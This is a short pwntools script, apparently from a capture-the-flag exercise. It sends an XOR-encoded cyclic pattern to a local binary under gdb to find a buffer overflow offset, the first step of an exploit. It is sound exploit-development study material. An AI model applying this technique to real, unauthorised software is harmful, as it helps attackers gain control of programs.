#!/usr/bin/env python3

from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64, xor

LOCAL_BIN = "../files/scary"

P = process(LOCAL_BIN, env={})
ELF_LOADED = ELF(LOCAL_BIN)
gdb.attach(P.pid, """
b *0x401c1e
display/i $pc
display/wx $rsp
c
""")
payload = cyclic(0x29a)
payload = xor(payload, 0x2a)
print(P.clean())
P.sendline(payload)
print("\ncyclic_find: ", cyclic_find(0x62616166), "\n") # 67
P.interactive()
